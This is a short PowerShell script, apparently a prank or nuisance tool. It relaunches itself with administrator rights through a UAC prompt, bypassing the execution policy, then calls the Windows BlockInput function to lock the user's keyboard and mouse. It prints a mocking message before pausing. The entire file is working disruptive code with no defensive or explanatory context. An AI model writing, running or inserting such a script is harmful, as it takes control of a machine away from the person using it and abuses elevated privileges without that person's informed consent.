if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs
    Exit
}
## requieres uac

#################################< BEGGING OF MOUSE AND KEYBOARD DISABLER >########################
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class User32 {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);
    }
"@

[User32]::BlockInput($true)
Write-Host "You cannot use your keyboard or mouse?? how sad..."
Start-Sleep -Seconds 3
#################################< END MOUSE AND KEYBOARD DISABLER >########################
